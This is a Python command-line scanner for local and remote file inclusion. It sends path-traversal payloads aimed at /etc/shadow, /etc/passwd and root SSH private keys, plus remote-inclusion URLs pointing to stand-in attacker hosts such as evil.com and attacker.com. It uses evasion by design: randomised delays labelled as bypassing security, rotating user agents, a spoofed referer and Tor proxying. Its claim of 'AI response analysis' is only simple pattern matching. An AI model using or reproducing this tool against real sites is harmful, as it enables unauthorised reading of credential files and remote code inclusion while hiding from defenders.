import argparse
import random
import re
import socket
import threading
import time
from urllib.parse import urljoin

import requests
import socks
from stem.control import Controller

# High-Level Advanced Payloads for LFI and RFI attacks
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "/proc/self/environ",
    "../../../../windows/win.ini",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../etc/shadow",
    "../../../../etc/group",
    "../../../../etc/hosts",
    "../../../../etc/network/interfaces",
    "../../../../etc/resolv.conf",
    "../../../../boot.ini",
    "../../../../winnt/win.ini",
    "../../../../../../../root/.ssh/id_rsa",
    "../../../../var/log/wtmp",
    "../../../../var/log/btmp",
    "../../../../proc/cpuinfo",
    "../../../../proc/self/status",
    "../../../../dev/mem",
    "../../../../dev/kmem",
    "../../../../dev/urandom",
    "../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../etc/shadow",
    "../../../../usr/local/apache/logs/access_log",
    "../../../../usr/local/apache/logs/error_log"
]

RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
    "https://raw.githubusercontent.com/evil/payload.txt",
    "http://malicious-site.com/backdoor.php",
    "http://attacker.com/malware.php",
    "http://attacker.com/cmd.txt",
    "http://malicious.com/remote.php",
    "http://evil.com/exploit.php",
    "http://hacker.net/shell.php",
    "http://attackserver.com/rce.php",
    "http://blackhat.com/xploit.txt",
    "http://dangerous.com/webshell.php",
    "http://exploitdb.com/payloads/shell.php",
    "http://attack-vector.com/evil.php",
    "http://testphp.vulnweb.com/hackable/uploads/malware.php",
    "https://example.com/malicious-code.php"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
]

HEADERS = {
    "Referer": "https://google.com",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9"
}

def use_tor():
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket

def analyze_response(response_text):
    patterns = ["root:x:", "<?php", "[boot]", "daemon:x:", "mysql:x:", "bin:x:", "ssh-rsa", "[global]", "[Server]", "[Database]", "[Error]", "Authorization Required", "Warning: include", "include_path"]
    for pattern in patterns:
        if re.search(pattern, response_text):
            return True
    return False

def scan(url, param):
    print(f"[+] Scanning {url} for High-Level LFI/RFI Vulnerabilities...\n")
    for payload in LFI_PAYLOADS + RFI_PAYLOADS:
        full_url = f"{url}?{param}={payload}"
        try:
            time.sleep(random.uniform(0.5, 2))  # Random delay to bypass security measures
            HEADERS["User-Agent"] = random.choice(USER_AGENTS)  # Rotate User-Agents
            response = requests.get(full_url, headers=HEADERS, timeout=5, allow_redirects=False)
            
            if analyze_response(response.text):
                print(f"[!] HIGH-RISK Vulnerability Detected: {full_url}")
                with open("scan_report.txt", "a") as log:
                    log.write(full_url + "\n")
            else:
                print(f"[-] Not Vulnerable: {full_url}")
        except requests.exceptions.RequestException:
            print(f"[!] Request Failed: {full_url}")

def check_file_inclusion(url):
    print("[+] Checking for common LFI/RFI endpoints...")
    endpoints = ["index.php", "view.php", "file.php", "load.php", "download.php", "show.php", "config.php", "admin.php"]
    for endpoint in endpoints:
        test_url = urljoin(url, endpoint)
        scan(test_url, "file")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced High-Level LFI & RFI Scanner with Security Evasion, Tor Support & AI Response Analysis")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", required=True, help="Parameter to test (e.g., page, file)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads for scanning")
    parser.add_argument("--tor", action="store_true", help="Use Tor for anonymous scanning")
    parser.add_argument("--check-endpoints", action="store_true", help="Automatically check for common LFI/RFI endpoints")
    args = parser.parse_args()
    
    if args.tor:
        use_tor()
    
    if args.check_endpoints:
        check_file_inclusion(args.url)
    else:
        threads = []
        for _ in range(args.threads):
            t = threading.Thread(target=scan, args=(args.url, args.param))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
